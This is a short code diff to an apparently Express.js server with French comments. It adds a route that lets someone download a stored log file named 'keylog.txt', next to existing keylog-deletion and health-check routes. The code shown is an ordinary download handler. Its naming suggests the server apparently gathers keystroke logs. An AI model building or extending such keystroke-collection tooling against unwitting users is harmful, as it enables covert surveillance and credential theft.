@@ -73,6 +73,13 @@ app.delete('/keylog', (req, res, next) => {
     });
 });
 
+// GET /download : télécharge le fichier de log principal
+app.get('/download', (req, res, next) => {
+    res.download(LOG_FILE, 'keylog.txt', (err) => {
+        if (err) return next(err);
+    });
+});
+
 // GET /health : monitoring simple
 app.get('/health', (req, res) => {
     res.status(200).json({ status: 'ok', time: new Date().toISOString() });
